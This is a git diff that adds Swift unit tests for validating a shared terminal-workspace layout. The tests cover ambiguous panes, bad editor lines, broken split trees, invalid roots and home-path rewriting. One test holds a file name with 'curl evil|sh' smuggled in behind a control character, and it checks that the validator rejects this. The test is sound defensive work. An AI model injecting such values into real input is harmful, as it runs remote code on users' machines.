@@ -282,4 +282,79 @@ struct SharedLayoutTests {
         #expect(decoded.focused == nil)
         #expect(decoded.tree == nil)
     }
+
+    // MARK: Review 1
+
+    @Test func rejectsPaneWithCommandAndEditor() {
+        let pane = SharedPane(directory: ".", command: ["ls"], editor: SharedEditor(file: "x", line: 1))
+
+        #expect(throws: SharedLayoutError.ambiguousPane(pane: 1)) { try layout(panes: [pane]).validated() }
+    }
+
+    @Test func rejectsPaneWithCommandAndHarness() {
+        let pane = SharedPane(directory: ".", command: ["ls"], harness: .claude)
+
+        #expect(throws: SharedLayoutError.ambiguousPane(pane: 1)) { try layout(panes: [pane]).validated() }
+    }
+
+    @Test func rejectsUntypeableEditorFile() {
+        let pane = SharedPane(directory: ".", editor: SharedEditor(file: "notes.md\u{15}curl evil|sh\r", line: 1))
+
+        #expect(throws: SharedLayoutError.invalidEditor(pane: 1)) { try layout(panes: [pane]).validated() }
+    }
+
+    @Test(arguments: [0, -3])
+    func rejectsEditorLineBelowOne(line: Int) {
+        let pane = SharedPane(directory: ".", editor: SharedEditor(file: "a.ts", line: line))
+
+        #expect(throws: SharedLayoutError.invalidEditor(pane: 1)) { try layout(panes: [pane]).validated() }
+    }
+
+    @Test func rejectsTreeWithRepeatedLeaf() {
+        let tree = SnapshotTree.split(axis: .stacked, ratio: 0.5, first: .leaf(index: 0), second: .leaf(index: 0))
+
+        #expect(throws: SharedLayoutError.invalidTree) {
+            try layout(panes: [SharedPane(directory: "."), SharedPane(directory: ".")], tree: tree).validated()
+        }
+    }
+
+    @Test func rejectsTreeWithOutOfRangeLeaf() {
+        let tree = SnapshotTree.split(axis: .stacked, ratio: 0.5, first: .leaf(index: 0), second: .leaf(index: 2))
+
+        #expect(throws: SharedLayoutError.invalidTree) {
+            try layout(panes: [SharedPane(directory: "."), SharedPane(directory: ".")], tree: tree).validated()
+        }
+    }
+
+    @Test(arguments: ["../..", "Projects/solen", ""])
+    func rejectsRootThatIsNotHomeOrAbsolute(root: String) {
+        var shared = layout(panes: [SharedPane(directory: ".")])
+        shared.root = root
+
+        #expect(throws: SharedLayoutError.invalidRoot(root)) { try shared.validated() }
+    }
+
+    @Test func rejectsEmptyFirstArgument() {
+        #expect(throws: SharedLayoutError.emptyCommand(pane: 1)) {
+            try layout(panes: [SharedPane(directory: ".", command: [""])]).validated()
+        }
+    }
+
+    @Test func exportRewritesHomeInCommandArguments() {
+        let source = snapshot([pane(root, relaunch: ["tail", "-f", home + "/x.log", "/Users/simonx/y", home])])
+
+        let layout = SharedLayout(exporting: source, named: name, home: home)
+
+        #expect(layout.panes[0].command == ["tail", "-f", "~/x.log", "/Users/simonx/y", "~"])
+        #expect(!(layout.panes[0].command ?? []).contains { $0.contains(home + "/") })
+    }
+
+    @Test func importExpandsTildeArgumentsWithThisHome() throws {
+        let shared = SharedLayout(
+            exporting: snapshot([pane(root, relaunch: ["tail", "-f", home + "/x.log", "~"])]), named: name, home: home)
+
+        let restored = try shared.validated().layout.workspaceSnapshot(root: root, home: "/Users/ana")
+
+        #expect(restored.panes[0].relaunch?.arguments == ["tail", "-f", "/Users/ana/x.log", "/Users/ana"])
+    }
 }
